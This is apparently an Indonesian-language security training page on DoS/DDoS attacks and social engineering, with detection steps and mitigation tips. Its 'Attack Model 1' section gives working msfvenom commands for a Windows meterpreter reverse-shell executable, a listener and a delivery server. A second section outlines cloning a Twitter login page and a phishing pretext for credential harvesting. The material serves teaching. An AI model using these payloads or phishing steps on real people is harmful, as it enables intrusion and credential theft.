Denial of Service (DoS & DDoS)

Memahami serangan yang bertujuan membuat resource mesin atau network tidak tersedia bagi pengguna yang berhak.

Apa itu Denial of Service?

Denial-of-Service (DoS) attack adalah serangan siber di mana pelaku berusaha membuat mesin atau resource network tidak tersedia bagi pengguna yang dituju dengan cara mengganggu layanan host yang terhubung ke Internet secara temporary atau indefinite.

DoS (Single Source)

Menggunakan satu koneksi/sumber untuk melakukan flood request ke target. Biasanya memerlukan bandwidth yang lebih besar dari target.

DDoS (Distributed)

Traffic flood berasal dari banyak sumber berbeda (botnet). Membuatnya mustahil untuk menghentikan serangan hanya dengan memblokir satu sumber.

Aspek DoS DDoS
Sumber Serangan Single source / satu koneksi Multiple sources / botnet
Skalabilitas Terbatas oleh bandwidth attacker Massive, distributed globally
Mitigasi Block single IP address Requires advanced filtering & CDN
Kompleksitas Relatif sederhana Memerlukan koordinasi banyak node

Kategori Serangan DoS

💥

Buffer Overflow Attacks

Memory buffer overflow menyebabkan mesin mengonsumsi seluruh hard disk space, memory, atau CPU time. Hasilnya: system sluggish, crash, atau deleterious server behavior.

🌊

Flood Attacks

Mensaturasi target server dengan jumlah packet yang overwhelming. Attacker harus memiliki bandwidth yang lebih besar dari target untuk keberhasilan.

⚠️ Catatan Penting

Historically, DoS attacks mengeksploitasi security vulnerabilities dalam network, software, dan hardware design. Namun kini DDoS attacks lebih prevalent karena memiliki disruptive capability yang lebih besar dan relatif mudah dibuat dengan tools yang tersedia.

Realitasnya: sebagian besar DoS attacks dapat diubah menjadi DDoS attacks.

Sejarah Serangan DoS

Smurf Attack

Malicious actor menggunakan broadcast address dari network yang vulnerable dengan mengirim spoofed packets, mengakibatkan flooding pada IP target.

Ping Flood

Serangan sederhana berbasis ICMP (ping) packets. Target dibanjiri dengan ping lebih banyak dari yang mampu di-respon, mengakibatkan denial-of-service. Dapat juga digunakan sebagai DDoS.

Ping of Death

Mengirimkan malformed packet ke mesin target, mengakibatkan system crash dan deleterious behavior. Sering disalahartikan dengan ping flood.

Demo: SYN Flooding Attack

SYN Flooding mengeksploitasi TCP Three-Way Handshake dengan mengirimkan SYN packets tanpa menyelesaikan handshake, mengonsumsi resource server.

Deteksi Serangan DoS

Untuk mendeteksi traffic DoS, kita dapat menggunakan KFSensor sebagai network sensor yang memonitor anomali traffic.

1. Download KFSensor

Kunjungi kfsensor.net dan download versi Free Trial. Software ini berfungsi sebagai IDS (Intrusion Detection System) berbasis Windows.

2. Install WinPcap/Npcap

KFSensor memerlukan packet capture library. Install WinPcap 4.1.3 atau Npcap untuk Windows modern.

3. Konfigurasi Permission

Ubah ownership file ke Administrators dan jalankan dengan privilege "Run as administrator". Pastikan UAC diset ke level yang sesuai.

4. Monitor Traffic

KFSensor akan menampilkan log connections, termasuk UDP, TCP, DNS, DHCP, dan FTP. Perhatikan spike anomali pada durasi dan jumlah connections.

Apa itu Social Engineering?

Social Engineering adalah penyalahgunaan psikologi manusia untuk memanipulasi atau menipu seseorang agar memberikan akses ke data pribadi atau informasi seperti login credentials, card numbers, dan sensitive data.

⚠️ Entry Points Social Engineering

Baiting

Menarik korban dengan "umpan" seperti USB berisi malware yang ditinggalkan di tempat umum.

Phishing & Spear-Phishing

Mengirim email/email yang ditargetkan (spear) yang tampak dari sumber terpercaya untuk mencuri credentials.

Pretexting

Membuat skenario palsu (pretext) untuk mendapatkan informasi sensitif dari target.

Unsafe Website

Memancing klik pada link berbahaya melalui email, pesan instan, atau pop-up window.

Attack Model 1: Payload Crafting

Membuat payload executable yang akan disampaikan ke target melalui teknik social engineering.

Step 1: Craft Payload dengan Msfvenom 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 -f exe > /home/kali/Downloads/soceng.exe
Step 2: Setup Handler (Listener) 
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 443
exploit
Step 3: Setup HTTP Server untuk Delivery 
python2 -m SimpleHTTPServer 8000
# atau untuk Python 3:
python3 -m http.server 8000

⚠️ Attack Flow

1
Craft payload soceng.exe dengan msfvenom
2
Setup reverse TCP handler di attacker machine
3
Deploy HTTP server untuk hosting payload
4
Target download & execute soceng.exe → Session opened!

📡 Hasil Serangan

Setelah target menjalankan file:

  • Meterpreter session terbuka
  • Command prompt target tersedia
  • Akses file system, keylogger, screenshot
  • Privilege escalation possible

🛡️ Mitigasi

  • Jangan download file dari sumber tidak dikenal
  • Verifikasi digital signature
  • Gunakan antivirus & EDR
  • User awareness training

Attack Model 2: Fake Website & Credential Harvesting

Membuat clone website untuk mencuri credentials korban menggunakan Social-Engineer Toolkit (SET).

🎣 Hasil Clone

Website clone akan tersedia di http://192.168.1.5 dengan tampilan identik Twitter login page. Korban yang login akan mengirim credentials ke attacker.

📧 Delivery Vector

Gunakan email blasting dengan pretext "Maintenance: Please update your password" yang mengarahkan ke IP attacker.
